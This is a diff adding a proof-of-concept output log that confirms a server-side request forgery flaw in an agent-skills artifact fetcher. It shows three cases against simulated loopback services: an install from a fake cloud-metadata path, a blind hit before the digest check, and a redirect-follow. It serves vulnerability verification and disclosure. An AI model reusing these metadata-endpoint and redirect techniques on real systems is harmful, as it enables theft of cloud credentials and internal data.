@@ -1,0 +1,58 @@
+=== C142 skills well-known unrestricted artifact URL SSRF ===
+skills HEAD: 7a5e920bead4b1039a6d6df5d7e1163b7b09423a
+publisher: http://127.0.0.1:44579
+internal (sim IMDS): http://127.0.0.1:40153
+digest of internal body: sha256:f6347321f7f7e8ea7f89babc20b2530b94c22173ab8e4af36bdbe631a1d65264
+
+--- Case A: absolute artifact URL → loopback, digest match → install ---
+{
+  "ok": true,
+  "skillName": "leaked-meta",
+  "installName": "helper",
+  "sourceUrl": "http://127.0.0.1:40153/latest/meta-data/",
+  "contentIncludesMarker": true,
+  "contentPreview": "---\nname: leaked-meta\ndescription: Simulated internal service body exfiltrated via unrestricted artifact URL\n---\n\n# Internal marker\n\nINTERNAL_ONLY_MARKER=ami-ssrf-c142-local\n---\nna",
+  "internalHits": [
+    {
+      "kind": "INTERNAL",
+      "method": "GET",
+      "url": "/latest/meta-data/",
+      "time": "2026-11-03T18:36:10.307Z"
+    }
+  ]
+}
+
+--- Case B: wrong digest still hits internal (blind SSRF) ---
+{
+  "skillReturned": false,
+  "blindInternalHits": [
+    {
+      "method": "GET",
+      "url": "/probe",
+      "headers": {
+        "host": "127.0.0.1:43919"
+      }
+    }
+  ],
+  "note": "fetchArtifactSkillByEntry calls fetch() before digest check; mismatch returns null but request already hit loopback"
+}
+
+--- Case C: same-origin relative url → 302 to other loopback host ---
+{
+  "ok": true,
+  "sourceUrl": "http://127.0.0.1:44179/.well-known/agent-skills/payload.md",
+  "redirectInternalHits": [
+    {
+      "url": "/meta"
+    }
+  ],
+  "contentHasMarker": true
+}
+
+=== SUMMARY ===
+{
+  "caseA_installFromInternal": true,
+  "caseB_blindHit": true,
+  "caseC_redirectFollow": true,
+  "verdict": "CONFIRMED: unrestricted artifact URL + pre-digest fetch = SSRF; matching digest installs internal body as skill"
+}
